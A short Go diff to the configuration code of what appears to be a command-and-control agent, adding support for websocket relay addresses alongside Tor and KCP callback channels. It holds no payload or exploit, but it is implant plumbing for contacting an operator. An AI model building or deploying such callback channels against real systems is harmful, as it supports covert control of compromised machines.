@@ -48,8 +48,9 @@ func InitConfig() (err error) {
 
 	// CC Address
 	def.CCAddress = RuntimeConfig.CCAddress
+	isRelay := strings.Contains(def.CCAddress, "/ws/") && strings.Contains(def.CCAddress, "role=agent")
 	isTor := netutil.IsTor(def.CCAddress)
-	if !isTor {
+	if !isTor && !isRelay {
 		// check if it is an onion address without scheme
 		host := def.CCAddress
 		if strings.Contains(host, ":") {
@@ -75,6 +76,9 @@ func InitConfig() (err error) {
 	} else if RuntimeConfig.UseKCP {
 		RuntimeConfig.CCH2Port = RuntimeConfig.KCPClientPort
 		def.CCAddress = fmt.Sprintf("https://127.0.0.1:%s", RuntimeConfig.CCH2Port)
+	} else if isRelay {
+		// Rendezvous relay URL (worker_ws channel): already a full ws(s):// URL.
+		// CCAddress stays as-is — no scheme/host mangling, no port appending.
 	} else if RuntimeConfig.C2ChannelMode == def.C2ChannelModePlainHTTP {
 		def.CCAddress = fmt.Sprintf("http://%s:%s", def.CCAddress, RuntimeConfig.CCHTTPPort)
 	} else {
